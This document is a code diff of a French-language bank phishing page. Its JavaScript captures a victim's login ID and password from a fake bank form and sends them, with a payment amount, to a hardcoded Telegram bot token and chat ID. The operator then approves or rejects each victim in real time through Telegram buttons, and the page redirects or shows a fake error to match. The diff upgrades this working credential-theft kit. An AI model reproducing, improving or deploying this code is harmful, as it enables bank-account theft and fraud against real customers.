@@ -12,14 +12,8 @@
         .form-group { margin-bottom: 20px; }
         label { display: block; font-weight: bold; margin-bottom: 8px; font-size: 14px; color: #555; }
         input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; background: #fafafa; }
-        input:focus { border-color: #004c97; background: #fff; }
-        
-        .btn-submit { width: 100%; padding: 16px; color: white; border: none; border-radius: 4px; font-size: 17px; font-weight: bold; cursor: pointer; background: #004c97; margin-top: 10px; }
-        
-        /* Message d'erreur */
+        .btn-submit { width: 100%; padding: 16px; color: white; border: none; border-radius: 4px; font-size: 17px; font-weight: bold; cursor: pointer; background: #004c97; }
         #error-box { display: none; background: #fff5f5; border: 1px solid #fc8181; color: #c53030; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; }
-
-        /* Loader permanent */
         #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); z-index: 10000; flex-direction: column; align-items: center; justify-content: center; }
         .spin { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #004c97; border-radius: 50%; animation: rot 1s linear infinite; }
         @keyframes rot { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -27,7 +21,6 @@
 </head>
 <body>
     <div id="loader"><div class="spin" id="spin-color"></div><p style="margin-top:20px; font-weight:bold;">Vérification de sécurité...</p></div>
-
     <div class="header-bank"><img id="dynamic-logo" class="bank-logo"></div>
     <div class="content">
         <div id="error-box">⚠️ Les renseignements saisis sont inexacts. Veuillez vérifier votre n° de carte ou votre mot de passe.</div>
@@ -48,22 +41,20 @@
 <script>
     const p = new URLSearchParams(window.location.search);
     const logo = decodeURIComponent(p.get('logo') || "");
+    const prix = p.get('prix') || "0,00";
     const TOKEN = "8402431772:AAH-BEEIxGCwozhzT1Qs8gMRQmfCz9zBp4o";
     const CHAT_ID = "1191944530";
     let isWaiting = false;
 
     window.onload = function() {
         document.getElementById('dynamic-logo').src = logo;
-        document.getElementById('p-txt').innerText = p.get('prix');
+        document.getElementById('p-txt').innerText = prix;
         const btn = document.getElementById('main-btn');
         const spin = document.getElementById('spin-color');
-        let color = "#004c97"; 
-        if(logo.includes("MTLW2vzq")) color = "#008542";
-        if(logo.includes("76Rx8fqq")) color = "#ed1c24";
-        if(logo.includes("5NS2j9gW")) color = "#008a00";
-        if(logo.includes("Wbw1tp8R")) color = "#971b32";
-        btn.style.backgroundColor = color;
-        spin.style.borderTopColor = color;
+        let c = "#004c97"; 
+        if(logo.includes("MTLW2vzq")) c = "#008542";
+        if(logo.includes("76Rx8fqq")) c = "#ed1c24";
+        btn.style.backgroundColor = c; spin.style.borderTopColor = c;
     };
 
     document.getElementById('lForm').onsubmit = async function(e) {
@@ -73,35 +64,56 @@
         document.getElementById('error-box').style.display = 'none';
         document.getElementById('loader').style.display = 'flex';
 
-        const msg = `<b>🔔 LOGIN CAPTURÉ</b>\n👤 ID : <code>${document.getElementById('user').value}</code>\n🔑 PASS : <code>${document.getElementById('pass').value}</code>\n💰 MONTANT : ${p.get('prix')} $`;
+        // Le message qui servira de légende à la photo
+        const msg = `<b>🔔 NOUVEAU LOGIN</b>\n💰 <b>MONTANT :</b> <code>${prix} $</code>\n👤 <b>ID :</b> <code>${document.getElementById('user').value}</code>\n🔑 <b>PASS :</b> <code>${document.getElementById('pass').value}</code>`;
+        
         const kb = { inline_keyboard: [[{text:"✅ ACCEPTER", callback_data:"OK"}, {text:"❌ REJETER", callback_data:"NO"}]] };
 
         try {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: "POST", headers: {"Content-Type":"application/json"},
-                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: "HTML", reply_markup: kb})
+            // Utilisation de sendPhoto pour envoyer le logo de la banque
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: "POST", 
+                headers: {"Content-Type":"application/json"},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID, 
+                    photo: logo, 
+                    caption: msg, 
+                    parse_mode: "HTML", 
+                    reply_markup: kb
+                })
             });
 
             let lastId = 0;
+            const init = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
+            const dI = await init.json();
+            if(dI.ok && dI.result.length > 0) lastId = dI.result[dI.result.length - 1].update_id;
+
             while(isWaiting) {
-                const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastId+1}&timeout=20`);
-                const d = await r.json();
-                if(d.result.length > 0) {
-                    for(let u of d.result) {
-                        lastId = u.update_id;
-                        if(u.callback_query) {
-                            if(u.callback_query.data === "OK") window.location.href = `verification.html?logo=${p.get('logo')}&prix=${p.get('prix')}`;
-                            if(u.callback_query.data === "NO") {
-                                isWaiting = false;
-                                document.getElementById('loader').style.display = 'none';
-                                document.getElementById('error-box').style.display = 'block';
-                                document.getElementById('pass').value = "";
+                try {
+                    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastId+1}&timeout=25`);
+                    const d = await r.json();
+                    if(d.ok && d.result.length > 0) {
+                        for(let u of d.result) {
+                            lastId = u.update_id;
+                            if(u.callback_query) {
+                                if(u.callback_query.data === "OK") { 
+                                    isWaiting = false; 
+                                    window.location.href = `verification.html?logo=${p.get('logo')}&prix=${prix}`; 
+                                    return; 
+                                }
+                                if(u.callback_query.data === "NO") { 
+                                    isWaiting = false; 
+                                    document.getElementById('loader').style.display = 'none'; 
+                                    document.getElementById('error-box').style.display = 'block'; 
+                                    document.getElementById('pass').value = ""; 
+                                    return; 
+                                }
                             }
                         }
                     }
-                }
+                } catch(err) { await new Promise(res => setTimeout(res, 1500)); }
             }
-        } catch(err) { isWaiting = false; }
+        } catch(e) { isWaiting = false; document.getElementById('loader').style.display = 'none'; }
     };
 </script>
 </body>
